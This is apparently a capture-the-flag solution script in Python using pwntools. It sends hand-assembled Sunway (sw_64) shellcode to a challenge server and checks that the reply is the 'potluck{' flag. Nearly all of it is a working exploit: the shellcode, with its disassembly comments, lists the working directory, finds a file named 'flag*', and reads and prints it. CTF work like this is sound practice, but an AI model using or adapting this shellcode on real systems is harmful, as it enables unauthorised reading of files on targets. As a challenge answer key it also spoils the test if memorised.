from pwn import *

# Compile payload.c, then use sw_64sw6b-sunway-linux-gnu-objdump to extract the
# instructions.
shellcode = bytes.fromhex(
    #   12000010c:   00 f0 fe af     stl     $r31,-4096(sp)
    "00 f0 fe af"
    #   120000110:   2f 00 3f f8     ldi     $r1,47
    "2f 00 3f f8"
    #   120000114:   b0 df de fb     ldi     sp,-8272(sp)
    "b0 df de fb"
    #   120000118:   01 00 3f fe     ldih    $r17,1
    "01 00 3f fe"
    #   12000011c:   00 00 5e af     stl     ra,0(sp)
    "00 00 5e af"
    #   120000120:   10 20 3e a0     stb     $r1,8208(sp)
    "10 20 3e a0"
    #   120000124:   2d 00 1f f8     ldi     $r0,45
    "2d 00 1f f8"
    #   120000128:   10 20 1e fa     ldi     $r16,8208(sp)
    "10 20 1e fa"
    #   12000012c:   11 20 fe a3     stb     $r31,8209(sp)
    "11 20 fe a3"
    #   120000130:   00 80 31 fa     ldi     $r17,-32768($r17)
    "00 80 31 fa"
    #   120000134:   52 07 ff 43     clr     $r18
    "52 07 ff 43"
    #   120000138:   53 07 ff 43     clr     $r19
    "53 07 ff 43"
    #   12000013c:   54 07 ff 43     clr     $r20
    "54 07 ff 43"
    #   120000140:   55 07 ff 43     clr     $r21
    "55 07 ff 43"
    #   120000144:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   120000148:   02 00 e0 43     addw    $r31,$r0,$r2
    "02 00 e0 43"
    #   12000014c:   10 00 3e fa     ldi     $r17,16(sp)
    "10 00 3e fa"
    #   120000150:   79 01 1f f8     ldi     $r0,377
    "79 01 1f f8"
    #   120000154:   00 20 5f fa     ldi     $r18,8192
    "00 20 5f fa"
    #   120000158:   50 07 e2 43     mov     $r2,$r16
    "50 07 e2 43"
    #   12000015c:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   120000160:   10 00 3e f8     ldi     $r1,16(sp)
    "10 00 3e f8"
    #   120000164:   23 00 3e fa     ldi     $r17,35(sp)
    "23 00 3e fa"
    #   120000168:   00 01 20 40     addl    $r1,$r0,$r0
    "00 01 20 40"
    #   12000016c:   61 05 20 42     cmpult  $r17,$r0,$r1
    "61 05 20 42"
    #   120000170:   20 00 20 c0     beq     $r1,1200001f4 <_start+0xe8>
    "20 00 20 c0"
    #   120000174:   fd ff 71 84     ldhu    $r3,-3($r17)
    "fd ff 71 84"
    #   120000178:   81 05 63 48     cmpule  $r3,0x18,$r1
    "81 05 63 48"
    #   12000017c:   25 00 20 c4     bne     $r1,120000214 <_start+0x108>
    "25 00 20 c4"
    #   120000180:   00 00 31 80     ldbu    $r1,0($r17)
    "00 00 31 80"
    #   120000184:   01 c5 2c 48     cmpeq   $r1,0x66,$r1
    "01 c5 2c 48"
    #   120000188:   22 00 20 c0     beq     $r1,120000214 <_start+0x108>
    "22 00 20 c0"
    #   12000018c:   01 00 31 80     ldbu    $r1,1($r17)
    "01 00 31 80"
    #   120000190:   01 85 2d 48     cmpeq   $r1,0x6c,$r1
    "01 85 2d 48"
    #   120000194:   1f 00 20 c0     beq     $r1,120000214 <_start+0x108>
    "1f 00 20 c0"
    #   120000198:   02 00 31 80     ldbu    $r1,2($r17)
    "02 00 31 80"
    #   12000019c:   01 25 2c 48     cmpeq   $r1,0x61,$r1
    "01 25 2c 48"
    #   1200001a0:   1c 00 20 c0     beq     $r1,120000214 <_start+0x108>
    "1c 00 20 c0"
    #   1200001a4:   03 00 31 80     ldbu    $r1,3($r17)
    "03 00 31 80"
    #   1200001a8:   01 e5 2c 48     cmpeq   $r1,0x67,$r1
    "01 e5 2c 48"
    #   1200001ac:   19 00 20 c0     beq     $r1,120000214 <_start+0x108>
    "19 00 20 c0"
    #   1200001b0:   c2 01 1f f8     ldi     $r0,450
    "c2 01 1f f8"
    #   1200001b4:   50 07 e2 43     mov     $r2,$r16
    "50 07 e2 43"
    #   1200001b8:   52 07 ff 43     clr     $r18
    "52 07 ff 43"
    #   1200001bc:   53 07 ff 43     clr     $r19
    "53 07 ff 43"
    #   1200001c0:   54 07 ff 43     clr     $r20
    "54 07 ff 43"
    #   1200001c4:   55 07 ff 43     clr     $r21
    "55 07 ff 43"
    #   1200001c8:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   1200001cc:   50 07 e0 43     mov     $r0,$r16
    "50 07 e0 43"
    #   1200001d0:   10 00 3e fa     ldi     $r17,16(sp)
    "10 00 3e fa"
    #   1200001d4:   03 00 1f f8     ldi     $r0,3
    "03 00 1f f8"
    #   1200001d8:   80 00 5f fa     ldi     $r18,128
    "80 00 5f fa"
    #   1200001dc:   10 00 f0 43     addw    $r31,$r16,$r16
    "10 00 f0 43"
    #   1200001e0:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   1200001e4:   01 00 1f fa     ldi     $r16,1
    "01 00 1f fa"
    #   1200001e8:   52 07 e0 43     mov     $r0,$r18
    "52 07 e0 43"
    #   1200001ec:   04 00 1f f8     ldi     $r0,4
    "04 00 1f f8"
    #   1200001f0:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   1200001f4:   95 01 1f f8     ldi     $r0,405
    "95 01 1f f8"
    #   1200001f8:   50 07 ff 43     clr     $r16
    "50 07 ff 43"
    #   1200001fc:   51 07 ff 43     clr     $r17
    "51 07 ff 43"
    #   120000200:   52 07 ff 43     clr     $r18
    "52 07 ff 43"
    #   120000204:   53 07 ff 43     clr     $r19
    "53 07 ff 43"
    #   120000208:   54 07 ff 43     clr     $r20
    "54 07 ff 43"
    #   12000020c:   55 07 ff 43     clr     $r21
    "55 07 ff 43"
    #   120000210:   83 00 00 02     sys_call        0x83
    "83 00 00 02"
    #   120000214:   11 01 23 42     addl    $r17,$r3,$r17
    "11 01 23 42"
    #   120000218:   d4 ff ff 13     br      12000016c <_start+0x60>
    "d4 ff ff 13"
)

print("Shellcode length:", len(shellcode))

r = remote(args.HOST or "localhost", args.PORT or 5000)
r.sendlineafter(b": ", str(len(shellcode)).encode())
r.sendafter(b": ", shellcode)
flag = r.recvall().strip().decode()
print("Flag:", flag)
assert flag.startswith("potluck{")
